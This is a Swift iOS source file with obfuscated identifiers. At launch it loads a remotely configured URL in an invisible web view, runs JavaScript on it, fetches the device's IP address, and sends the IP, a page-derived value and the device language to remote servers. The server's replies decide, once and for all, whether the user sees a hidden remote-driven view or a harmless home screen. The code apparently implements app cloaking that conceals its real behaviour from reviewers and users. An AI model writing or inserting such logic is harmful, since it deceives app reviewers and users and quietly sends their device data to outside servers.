import SwiftUI
@preconcurrency import WebKit
import OneSignalFramework
import Combine

struct Tizolo: View {

    @State var semi: String = ""
    @State private var sehojamaj: Bool?

    @State var zayeburum: String = ""
    @State var biyoyajuhe = false
    @State var jacuhezodo = false

    @State private var dogumeba: Bool = true
    @State private var ximazuwa: Bool = true
    @AppStorage(Wuzipij.Dazizogu.lokimez) var terega: Bool = true
    @AppStorage(Wuzipij.Dazizogu.zotaros) var horukaru: Bool = true

    var body: some View {
        ZStack {
            if ximazuwa {
                SplashScreen(loading: true)
                    .zIndex(1)
            }

            if sehojamaj != nil {
                if terega {
                    Jopema(
                        semi: $semi,
                        zayeburum: $zayeburum,
                        biyoyajuhe: $biyoyajuhe,
                        jacuhezodo: $jacuhezodo)
                    .opacity(0)
                    .zIndex(2)
                }

                if biyoyajuhe || !horukaru {
                    Diluqoxo()
                        .zIndex(3)
                        .onAppear {
                            horukaru = false
                            terega = false
                            ximazuwa = false
                        }
                }

                if jacuhezodo {
                    if dogumeba {
                        SplashScreen(loading: true)
                            .zIndex(4)
                            .onAppear {
                                AppDelegate.orientationLock = .portrait
                                UIDevice.current.setValue(UIInterfaceOrientation.portrait.rawValue, forKey: Wuzipij.Dazizogu.copik)
                                DispatchQueue.main.asyncAfter(deadline: .now() + 3) { dogumeba = false }
                            }
                    } else {
                        HomeView()
                            .zIndex(5)
                    }
                }
            }
        }
        .animation(.easeInOut, value: ximazuwa)
        .onChange(of: jacuhezodo) { if $0 { ximazuwa = false } }
        .onAppear {
            OneSignal.Notifications.requestPermission { sehojamaj = $0 }

            guard let goropobizo = URL(string: Wuzipij.Cuyeyanimeci.jedixaxu) else { return }

            URLSession.shared.dataTask(with: goropobizo) { qozixodux, _, _ in
                guard let qozixodux else { return }

                guard let qusukeyap = try? JSONSerialization.jsonObject(with: qozixodux, options: []) as? [String: Any] else { return }

                guard let dolimame = qusukeyap[Wuzipij.Cuyeyanimeci.decek] as? String else { return }

                DispatchQueue.main.async { semi = dolimame }
            }
            .resume()
        }
    }
}

extension Tizolo {

    struct Jopema: UIViewRepresentable {

        @Binding var semi: String
        @Binding var zayeburum: String
        @Binding var biyoyajuhe: Bool
        @Binding var jacuhezodo: Bool

        func makeUIView(context: Context) -> WKWebView {
            let darila = WKWebView()
            darila.navigationDelegate = context.coordinator

            if let sitehaduyo = URL(string: semi) {
                var juvaqeyo = URLRequest(url: sitehaduyo)
                juvaqeyo.httpMethod = "GET"
                juvaqeyo.setValue(Wuzipij.Dazizogu.cobuxawime, forHTTPHeaderField: Wuzipij.Dazizogu.jiji)

                let woyoduyuy = [Wuzipij.Dazizogu.mivilibo: Wuzipij.Cuyeyanimeci.fuqe,
                                 Wuzipij.Dazizogu.lefewehe: Wuzipij.Cuyeyanimeci.kapaq]
                for (manehopaz, jelu) in woyoduyuy {
                    juvaqeyo.setValue(jelu, forHTTPHeaderField: manehopaz)
                }

                darila.load(juvaqeyo)
            }
            return darila
        }

        func updateUIView(_ uiView: WKWebView, context: Context) {}

        func makeCoordinator() -> Tabujiqare {
            Tabujiqare(self)
        }

        class Tabujiqare: NSObject, WKNavigationDelegate {

            var fexawey: Jopema
            var xibubo: String?
            var qowesagipu: String?

            init(_ veqavisawa: Jopema) {
                self.fexawey = veqavisawa
            }

            func webView(_ pije: WKWebView, didFinish navigation: WKNavigation!) {
                pije.evaluateJavaScript(Wuzipij.Dazizogu.cegoyikuw) { [unowned self] (lezagohir: Any?, error: Error?) in
                    guard let miqof = lezagohir as? String else {
                        fexawey.jacuhezodo = true
                        return
                    }

                    self.zaxuku(miqof)

                    pije.evaluateJavaScript(Wuzipij.Dazizogu.qeduhiwipe) { (nuburuv, error) in
                        if let hegaraq = nuburuv as? String {
                            self.qowesagipu = hegaraq
                        }
                    }
                }
            }

            func zaxuku(_ bovu: String) {
                guard let jiyulutava = jalagamo(from: bovu) else {
                    fexawey.jacuhezodo = true
                    return
                }

                let yivacolu = jiyulutava.trimmingCharacters(in: .whitespacesAndNewlines)

                guard let hanibu = yivacolu.data(using: .utf8) else {
                    fexawey.jacuhezodo = true
                    return
                }

                do {
                    let xawix = try JSONSerialization.jsonObject(with: hanibu, options: []) as? [String: Any]
                    guard let vepi = xawix?[Wuzipij.Dazizogu.sucinof] as? String else {
                        fexawey.jacuhezodo = true
                        return
                    }

                    guard let vatul = xawix?[Wuzipij.Dazizogu.pavese] as? String else {
                        fexawey.jacuhezodo = true
                        return
                    }

                    DispatchQueue.main.async {
                        self.fexawey.semi = vepi
                        self.fexawey.zayeburum = vatul
                    }

                    self.sepop(with: vepi)

                } catch {
                    print("\(Wuzipij.Dazizogu.topahi)\(error.localizedDescription)")
                }
            }

            func jalagamo(from bovu: String) -> String? {
                guard let startRange = bovu.range(of: "{"),
                      let endRange = bovu.range(of: "}", options: .backwards) else {
                    return nil
                }

                let bilicuza = String(bovu[startRange.lowerBound..<endRange.upperBound])
                return bilicuza
            }

            func sepop(with vakulowi: String) {
                guard let xometu = URL(string: vakulowi) else {
                    fexawey.jacuhezodo = true
                    return
                }

                hidapefa { tijayiho in
                    guard let tijayiho else {
                        return
                    }

                    self.xibubo = tijayiho

                    var jotah = URLRequest(url: xometu)
                    jotah.httpMethod = "GET"
                    jotah.setValue(Wuzipij.Dazizogu.cobuxawime, forHTTPHeaderField: Wuzipij.Dazizogu.jiji)

                    let sabehu = [
                        Wuzipij.Dazizogu.luquqaf: Wuzipij.Cuyeyanimeci.netine,
                        Wuzipij.Dazizogu.keduca: self.xibubo ?? "",
                        Wuzipij.Dazizogu.havaqubamu: self.qowesagipu ?? "",
                        Wuzipij.Dazizogu.gasisi: Locale.preferredLanguages.first ?? Wuzipij.Dazizogu.catajap
                    ]

                    for (vipoki, tocab) in sabehu {
                        jotah.setValue(tocab, forHTTPHeaderField: vipoki)
                    }

                    URLSession.shared.dataTask(with: jotah) { [unowned self] yeziqu, yexu, error in
                        guard let yeziqu, error == nil else {
                            print("\(Wuzipij.Dazizogu.heviz)\(error?.localizedDescription.description ?? Wuzipij.Dazizogu.maropesuvu)")
                            fexawey.jacuhezodo = true
                            return
                        }
                        if let quhiji = yexu as? HTTPURLResponse {
                            print("\(Wuzipij.Dazizogu.wepipogi)\(quhiji.statusCode)")

                            if quhiji.statusCode == 200 {
                                self.hese()
                            } else {
                                self.fexawey.jacuhezodo = true
                            }
                        }

                        if let mokixe = String(data: yeziqu, encoding: .utf8) {
                            print("\(Wuzipij.Dazizogu.tefabuse)\(mokixe)")
                        }
                    }.resume()
                }
            }

            func hese() {

                let toyerave = self.fexawey.zayeburum

                guard let makiya = URL(string: toyerave) else {
                    fexawey.jacuhezodo = true
                    return
                }

                var yofijuf = URLRequest(url: makiya)
                yofijuf.httpMethod = "GET"
                yofijuf.setValue(Wuzipij.Dazizogu.cobuxawime, forHTTPHeaderField: Wuzipij.Dazizogu.jiji)

                let cabayem = [
                    Wuzipij.Dazizogu.luquqaf: Wuzipij.Cuyeyanimeci.netine,
                    Wuzipij.Dazizogu.keduca: self.xibubo ?? "",
                    Wuzipij.Dazizogu.havaqubamu: self.qowesagipu ?? "",
                    Wuzipij.Dazizogu.gasisi: Locale.preferredLanguages.first ?? Wuzipij.Dazizogu.catajap
                ]

                for (hahuqajes, yozuda) in cabayem {
                    yofijuf.setValue(yozuda, forHTTPHeaderField: hahuqajes)
                }

                URLSession.shared.dataTask(with: yofijuf) { [unowned self] kufuladus, rini, error in
                    guard let kufuladus = kufuladus, error == nil else {
                        fexawey.jacuhezodo = true
                        return
                    }

                    if let rohununac = String(data: kufuladus, encoding: .utf8) {

                        do {
                            let sucavopuyu = try JSONSerialization.jsonObject(with: kufuladus, options: []) as? [String: Any]
                            guard let timovoca = sucavopuyu?[Wuzipij.Dazizogu.jayeqo] as? String,
                                  let metajigapa = sucavopuyu?[Wuzipij.Dazizogu.fowepoqub] as? String,
                                  let duta = sucavopuyu?[Wuzipij.Dazizogu.mubu] as? String else {

                                return
                            }

                            Rohuhevuzuc.shared.timovoca = timovoca
                            Rohuhevuzuc.shared.metajigapa = metajigapa
                            Rohuhevuzuc.shared.duta = duta

                            OneSignal.login(Rohuhevuzuc.shared.duta ?? "")
                            OneSignal.User.addTag(key: Wuzipij.Dazizogu.zuhupicaw, value: Rohuhevuzuc.shared.metajigapa ?? "")

                            self.fexawey.biyoyajuhe = true

                        } catch {
                            fexawey.jacuhezodo = true
                        }
                    }
                }.resume()
            }

            func hidapefa(completion: @escaping (String?) -> Void) {
                let zoqanal = URL(string: Wuzipij.Dazizogu.jowiv)!
                let tawemelaq = URLSession.shared.dataTask(with: zoqanal) { masujoqiji, sobejexof, error in
                    guard let masujoqiji, let ipAddress = String(data: masujoqiji, encoding: .utf8) else {
                        completion(nil)
                        return
                    }
                    completion(ipAddress)
                }
                tawemelaq.resume()
            }
        }
    }
}
